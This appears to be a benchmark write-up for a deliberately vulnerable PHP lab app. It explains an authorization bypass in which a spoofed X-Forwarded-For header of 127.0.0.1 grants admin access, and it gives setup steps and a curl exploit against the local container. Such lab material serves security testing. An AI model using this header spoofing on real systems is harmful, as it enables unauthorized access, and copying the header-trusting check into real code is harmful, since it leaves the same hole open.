# XBEN-085-24 — Auth 3

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability:** Authorization bypass via spoofable `X-Forwarded-For` header. The app checks
`$_SERVER['HTTP_X_FORWARDED_FOR']` against an allow-list (`127.0.0.1`, `localhost`) to decide
whether to treat the requester as an internal admin — trivially spoofable by any client.

## Setup

```bash
cd /Users/younessbouchari/red-purple/xbow/benchmarks/XBEN-085-24
make run
docker compose port web 80   # -> host port, e.g. 0.0.0.0:62171
```

## Exploit

```bash
curl -s -X POST http://localhost:62171/index.php \
  -H "X-Forwarded-For: 127.0.0.1" \
  -d "username=a&password=b"
```
